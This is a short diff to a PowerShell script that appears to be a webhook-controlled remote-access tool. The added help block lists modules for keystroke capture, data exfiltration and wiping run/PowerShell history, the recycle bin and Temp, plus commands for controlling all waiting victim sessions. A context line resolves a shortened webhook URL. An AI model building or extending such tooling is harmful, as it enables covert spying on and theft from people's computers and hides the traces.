@@ -1,4 +1,22 @@
 
+# =====================================================================================================================================================
+<#
+    ExtraInfo: Get a list of further info and command examples
+
+    Cleanup: Wipe history (run prompt, powershell, recycle bin, Temp)
+
+    Kill: Stop a running module (eg. Keycapture / Exfiltrate)
+
+    ControlAll: Control all waiting sessions simultaneously
+
+    ShowAll: Control all waiting sessions simultaneously
+
+    Pause: Pause the current authenticated session
+
+    Close: Close this session
+
+#>
+# =====================================================================================================================================================
 # shortened URL Detection
 if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
 
